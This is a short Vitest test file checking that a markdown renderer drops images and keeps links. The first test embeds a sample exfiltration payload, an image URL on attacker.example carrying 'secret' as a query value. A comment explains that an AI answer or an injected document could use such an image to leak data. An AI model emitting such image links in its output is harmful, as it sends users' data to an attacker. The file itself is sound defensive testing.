import { describe, expect, it } from "vitest";
import { renderMarkdown } from "./markdown";

describe("renderMarkdown", () => {
  it("renders an image as nothing", () => {
    // Arrange
    // A rendered <img> makes the browser fetch the URL, so an answer (or an
    // injected document) could leak data to an attacker's server.
    const answer = "Before ![](https://attacker.example/leak.png?d=secret) after";
    // Act
    const html = renderMarkdown(answer);
    // Assert
    expect(html).not.toContain("<img");
    expect(html).not.toContain("attacker.example");
  });

  it("still renders a link", () => {
    // Arrange
    const answer = "[Reuters](https://www.reuters.com/world/)";
    // Act
    const html = renderMarkdown(answer);
    // Assert
    expect(html).toContain('<a href="https://www.reuters.com/world/"');
    expect(html).toContain(">Reuters</a>");
  });
});
